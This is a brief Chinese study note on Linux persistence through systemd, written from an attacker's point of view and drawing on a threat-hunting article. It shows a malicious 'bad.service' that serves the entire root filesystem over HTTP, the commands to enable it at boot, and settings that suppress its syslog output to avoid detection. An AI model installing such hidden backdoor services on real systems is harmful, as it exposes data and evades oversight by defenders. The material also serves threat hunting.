---
tags:
  - 操作系统
  - Linux
  - 木马
  - Systemd
参考: https://pberba.github.io/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/
---
背景：为了使得木马躲避杀毒软件，考虑在杀毒软件启动前启动木马程序，这需要将我们的木马与**服务**联系起来    

Systemd services是用来管理守护进程的，所以攻击者的一种思路就是利用 Systemd 安装自己的恶意服务，这样在重新启动机器后，他们的后门服务也将重新启动。

安装新服务的方法：在`/etc/systemd/system/`或`/lib/systemd/system/`中创建服务单元文件`*.service`。  

## 1.1 一个`rsyslog.service`的例子  

```toml
[Unit]
Description=System Logging Service
Requires=syslog.socket
Documentation=man:rsyslogd(8)
Documentation=https://www.rsyslog.com/doc/

[Service]
Type=notify
ExecStart=/usr/sbin/rsyslogd -n -iNONE
StandardOutput=null
Restart=on-failure

# Increase the default a bit in order to allow many simultaneous
# files to be monitored, we might need a lot of fds.
LimitNOFILE=16384

[Install]
WantedBy=multi-user.target
Alias=syslog.service
```

重点关注其中的两行：  

- `ExecStart`: 服务启动时执行的命令  
- `WantedBy`: 这里的值`multi-user.target`, 表示服务在（boot time）启动  

## 1.2 安装恶意服务  

### 1.2.1 可供选择的路径  

通过命令`systemd-analyze unit-paths`(--user)来枚举完整路径以及**顺序**  

- 注意，越靠前的顺序优先级越高，同名服务只看第一个

### 1.2.2 最简例子  

创建`/etc/systemd/system/bad.service`

```toml
[Unit]
Description=Example of bad service

[Service]
ExecStart=python3 -m http.server --directory /

[Install]
WantedBy=multi-user.target
```

创建这个文件后，使用命令`systemctl enable bad`来激活  

- 激活的时候，会自动在路径中查找我们的`bad.service`, 并为每个`WantedBy`里的目标创建一个链接(symlink)  

- 也可以手动创建：

```shell
  ln -s /etc/systemd/system/bad.service /etc/systemd/system/multi-user.target.wants/bad.service
```

### 1.2.3 隐藏某些输出  

默认情况下，会在*syslog* 有所输出，我们可以在之前创建的文件中`[Service]`中加入下面几行  

```
StandardOutput=null
StandardError=null
```

